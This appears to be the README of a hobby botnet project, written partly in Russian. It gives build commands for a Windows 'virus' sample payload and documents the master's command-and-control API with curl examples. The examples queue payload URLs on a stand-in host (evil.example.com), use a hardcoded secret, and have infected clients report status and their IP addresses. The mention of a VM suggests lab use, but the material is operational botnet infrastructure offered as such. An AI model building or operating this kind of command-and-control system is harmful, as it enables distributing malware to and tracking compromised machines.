> "botnet" is already cool enough

## Build
#### virus(sample payload)
`cargo zigbuild --bin virus --release --target x86_64-pc-windows-gnu`
#### cook iso for VM 
`xorriso -outdev output.iso -blank as_needed -map target/x86_64-pc-windows-gnu/release/virus.exe /virus.exe`

## Master API (port 6767)

### `GET /poll` — забрать всю очередь вирусов
```bash
curl -s http://localhost:6767/poll
```
```json
[{"id":1,"url":"http://evil.example.com/payload.bin","status":"created","out":null}]
```

### `POST /virus_add` — новый вирус в очередь

Секрет обязателен, иначе `401`. Ответ: `id = id последнего + 1`, статус `created`, `out = null`.
```bash
curl -s -X POST http://localhost:6767/virus_add \
  -H "Content-Type: application/json" \
  -d '{"url": "http://evil.example.com/payload.bin", "secret": "gazan67"}'
```
```json
{"id":1,"url":"http://evil.example.com/payload.bin","status":"created","out":null}
```

Неверный секрет → `HTTP 401`:
```bash
curl -s -w "\nHTTP %{http_code}\n" -X POST http://localhost:6767/virus_add \
  -H "Content-Type: application/json" \
  -d '{"url": "http://evil.example.com/payload.bin", "secret": "wrong"}'
```

### `POST /virus_status` — отчитаться о результате

Тело: `{"id": ..., "status": ..., "out": [...]}`. `out` — `Vec<u8>`, т.е. **массив чисел** (байтов), не строка.

* `cooked` — вирус скомпилирован, `out` = результат:
```bash
curl -s -X POST http://localhost:6767/virus_status \
  -H "Content-Type: application/json" \
  -d '{"id": 1, "status": "cooked", "out": [104, 101, 108, 108, 111]}'
```
Ответ: `virus 1 is cooked`

* `fifty` — промежуточный статус:
```bash
curl -s -X POST http://localhost:6767/virus_status \
  -H "Content-Type: application/json" \
  -d '{"id": 1, "status": "fifty", "out": [1, 2, 3]}'
```
Ответ: `virus 1 is fifty`

* `accepted` — клиент принял вирус, `out` = его IP в UTF-8 байтах (мастер кладёт пару `ip -> id` в `pro`). Пример для IP `192.168.1.13`:
```bash
curl -s -X POST http://localhost:6767/virus_status \
  -H "Content-Type: application/json" \
  -d '{"id": 1, "status": "accepted", "out": [49,57,50,46,49,54,56,46,49,46,49,51]}'
```
Ответ: `virus 1 accepted`

Не считать байты IP вручную:
```bash
python3 -c 'import sys,json; ip=sys.argv[1]; print(json.dumps({"id":1,"status":"accepted","out":list(ip.encode())}))' 192.168.1.13 | \
  curl -s -X POST http://localhost:6767/virus_status -H "Content-Type: application/json" -d @-
```

Любой другой статус → `virus <id>: прислал хуйню <статус>`.
